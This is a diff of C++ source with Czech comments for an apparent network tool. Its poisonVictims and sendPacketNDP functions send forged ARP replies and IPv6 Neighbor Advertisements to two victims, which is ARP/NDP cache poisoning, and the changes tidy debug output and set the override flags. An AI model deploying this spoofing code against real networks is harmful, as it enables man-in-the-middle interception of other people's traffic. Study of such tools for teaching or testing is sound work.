@@ -253,6 +253,27 @@ std::string createAddress(u_char * input)
 }
 
 /**
+ * Funkce pro převod adresy z binární reprezentace na string.
+ * @param input - vstupní adresa v u_char
+ * @return  - adresa v podobě stringu
+ */
+std::string macToString(u_char * input)
+{
+	char tmp[4];
+	std::string output;
+	for(int i =0; i < 5; i++){
+		if(i == 2 || i == 4)
+			output += ".";
+		sprintf(&tmp[0], "%02x", input[i]);
+		output += tmp;
+
+	}
+	sprintf(&tmp[0], "%02x", input[5]);
+	output += tmp;
+	return output;
+}
+
+/**
  * Funkce pro vytvoření ARP paketu pro skenování,
  * @param intInfo - struktura s informacemi o rozhraní
  * @param arpHdr - ukazatel na místo v paměti pro ARP hlavičku
@@ -359,7 +380,6 @@ void scanIPv4(INTERFACE_INFO* intInfo)
 	printIP(intInfo->networkAddress);
 	
 	inet_pton(AF_INET,createAddress(intInfo->interfaceAdd).c_str(),&src_address.sin_addr);
-	cerr<<"test arp4"<<endl;
 	inet_pton(AF_INET,createAddress(intInfo->networkAddress).c_str(),&dst_address.sin_addr);
 	
 	dst_ip = ntohl(dst_address.sin_addr.s_addr);
@@ -669,7 +689,6 @@ void printMAC(u_char * mac)
  */
 void printIP(u_char * ip)
 {
-	cerr<<"IP adresa užívaného rozhranní:";
 	for(int i = 0; i < 3; i++)
 		fprintf (stderr,"%d.", ip[i]);
 	fprintf (stderr,"%d\n", ip[3]);
@@ -706,8 +725,17 @@ void poisonVictims(INTERFACE_INFO* intInfo, int time, char* mac1, char* mac2, ch
 		exit (EXIT_FAILURE);
 	}
 			
-	sendPacketNDP(intInfo->interfaceMac,ip1,mac2,ip2,sockfd, device, ND_NEIGHBOR_SOLICIT);	// Navázání spojení pro otrávení
-	sendPacketNDP(intInfo->interfaceMac,ip2,mac1,ip1,sockfd, device ,ND_NEIGHBOR_SOLICIT);	// Navázání spojení pro otrávení
+	// Konverze char* na u_char pro MAC adresy
+	u_char victim1tmp[ETH_ADDR_LEN];
+	createMacAdress(victim1tmp,mac1);
+	u_char victim2tmp[ETH_ADDR_LEN];
+	createMacAdress(victim2tmp,mac2);
+	
+	if(!arp){
+//		sendPacketNDP(victim1tmp,ip1,mac2,ip2,sockfd, device, ND_NEIGHBOR_SOLICIT);	// Navázání spojení pro otrávení
+//		sendPacketNDP(victim2tmp,ip2,mac1,ip1,sockfd, device ,ND_NEIGHBOR_SOLICIT);	// Navázání spojení pro otrávení	
+	}
+
 	
 	close(sockfd);
 	
@@ -724,17 +752,14 @@ void poisonVictims(INTERFACE_INFO* intInfo, int time, char* mac1, char* mac2, ch
 			sendPacketARP(intInfo->interfaceMac,ip1,mac2,ip2,sockfd, device);
 			cerr<<"Odeslán první ARP"<<endl;
 			sendPacketARP(intInfo->interfaceMac,ip2,mac1,ip1,sockfd, device);			
-			cerr<<"Odeslán první ARP"<<endl;
+			cerr<<"Odeslán druhý ARP"<<endl;
 		}
 		else{
-			cerr<<"MAC: ";
-			printMAC(intInfo->interfaceMac);
-			cerr<<endl;
 			// Zasílání NDP packetů
 			sendPacketNDP(intInfo->interfaceMac,ip1,mac2,ip2,sockfd, device, ND_NEIGHBOR_ADVERT);	// Podvržení MAC adress
 			cerr<<"Odeslán první NDP"<<endl;
 			sendPacketNDP(intInfo->interfaceMac,ip2,mac1,ip1,sockfd, device ,ND_NEIGHBOR_ADVERT);	// Podvržení MAC adres	
-			cerr<<"Odeslán první NDP"<<endl;
+			cerr<<"Odeslán druhý NDP"<<endl;
 		}
 		close(sockfd);
 		usleep(time*1000000);
@@ -751,7 +776,6 @@ u_char* createMacAdress(uint8_t* outMac, char* inMac)
 {
 	unsigned int values[6];
 	int i;
-	cerr<<"test"<<endl;
 	if( 6 == sscanf( inMac, "%x:%x:%x:%x:%x:%x",
 		&values[0], &values[1], &values[2],
 		&values[3], &values[4], &values[5] ) )
@@ -903,17 +927,24 @@ void sendPacketNDP(u_char* interfaceMac,
 	send_icmphdr.icmp6_code = 0;
 	
 	// R,S,O, res nastavení
-	icmpv6_opt.flags[0] = 0x50;
-	icmpv6_opt.flags[1] = 0x00;
-	icmpv6_opt.flags[2] = 0x00;
-	icmpv6_opt.flags[3] = 0x00;
+//	icmpv6_opt.flags[0] = 0x70;
+
 	// Zdrojová IP
 	inet_pton (AF_INET6, srcIp, &(icmpv6_opt.ip6_src));
 	// MAC adresa
-	if(PACKET_TYPE == ND_NEIGHBOR_ADVERT)
+	if(PACKET_TYPE == ND_NEIGHBOR_ADVERT){
 		icmpv6_opt.type = 0x02;
-	else
+		icmpv6_opt.flags[0] = 0x70;
+	}
+	else{
 		icmpv6_opt.type = 0x01;
+		icmpv6_opt.flags[0] = 0x00;
+	}
+	// R,S,O, res nastavení
+	icmpv6_opt.flags[1] = 0x00;
+	icmpv6_opt.flags[2] = 0x00;
+	icmpv6_opt.flags[3] = 0x00;	
+	
 	icmpv6_opt.len = 0x01;
 	memcpy(icmpv6_opt.mac,interfaceMac,6*sizeof(u_char));
 		
